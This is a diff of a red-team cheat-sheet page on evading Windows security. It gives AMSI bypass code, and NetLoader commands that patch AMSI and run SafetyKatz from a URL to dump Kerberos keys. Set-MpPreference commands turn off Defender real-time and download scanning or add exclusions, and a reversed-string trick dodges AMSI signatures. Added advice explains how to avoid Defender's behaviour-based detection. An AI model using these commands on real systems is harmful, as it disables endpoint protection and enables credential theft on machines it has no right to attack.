@@ -2,7 +2,7 @@
 
 ## AMSI Bypass
 
-### PowerShell AMSI Bypass &#x20;
+### PowerShell AMSI Bypass
 
 {% tabs %}
 {% tab title="Obfuscated" %}
@@ -55,9 +55,7 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 
 {% embed url="https://github.com/OmerYa/Invisi-Shell" %}
 
-Invisi-Shell bypasses all of PowerShell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking&#x20;
-
-Usage
+Invisi-Shell bypasses all of PowerShell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking.
 
 ```powershell
 # With admin privileges:
@@ -73,7 +71,7 @@ exit
 
 ### Loader
 
-use [`NetLoader` ](https://github.com/Flangvik/NetLoader)to unhook ETW and patch AMSI then run executable from URL without saving
+Use [`NetLoader` ](https://github.com/Flangvik/NetLoader)to unhook ETW and patch AMSI then run executable from URL without saving. Use port forwarder instead of running them directly. Otherwise, this triggers Defender’s behavior-based detection: executable downloaded from remote web server. Read more inside [#http-server](transfer-files.md#http-server "mention")
 
 ```powershell
 NetLoader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
@@ -83,7 +81,9 @@ NetLoader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 
 > **Note:** If Tamper protection is enabled you will not be able to turn off Defender by CMD or PowerShell. You can however, still create an exclusion.
 
-Disable real time monitoring
+Check Windows Defender Status with `Get-MpComputerStatus`
+
+Disable real time monitoring. Need local admin access.
 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -95,13 +95,29 @@ Disable scanning for downloaded files (more silent and preferred)
 Set-MpPreference -DisableIOAVProtection $true
 ```
 
-Create an exclusion
+Create an exclusion if nothing works.
 
 ```powershell
 Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 ```
 
-## Firewall&#x20;
+## AppLocker
+
+### List AppLocker Rules
+
+```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+### Test AppLocker Policy
+
+{% code fullWidth="false" %}
+```powershell
+Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
+```
+{% endcode %}
+
+## Firewall
 
 > **Note:** requires Admin privileges.
 
@@ -119,13 +135,13 @@ Disable manually
 
 ### AMSITrigger
 
-&#x20;identify the part of a script is detected
+identify the part of a script is detected
 
 {% embed url="https://github.com/RythmStick/AMSITrigger" %}
 AMSITrigger
 {% endembed %}
 
-usage
+Usage:
 
 ```powershell
 AmsiTrigger_x64.exe -i PowerUp.ps1 
@@ -135,11 +151,11 @@ Example for scanning
 
 <figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-Example for bypassing&#x20;
+Example for bypassing
 
 <pre class="language-powershell"><code class="lang-powershell"><strong># Reverse the "Net.Sockets" string
-</strong><strong>
-</strong><strong>$String = "stekcoS.teN"
+</strong>
+<strong>$String = "stekcoS.teN"
 </strong>$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
 if ($Reverse)
 {
@@ -147,7 +163,7 @@ if ($Reverse)
 }
 </code></pre>
 
-### DefenderChecker&#x20;
+### DefenderChecker
 
 Identify code and strings from a binary / file that Windows Defender may flag
 
@@ -155,9 +171,8 @@ Identify code and strings from a binary / file that Windows Defender may flag
 DefenderChecker
 {% endembed %}
 
-usage
+Usage:
 
 ```powershell
 DefenderCheck.exe PowerUp.ps1 
 ```
-
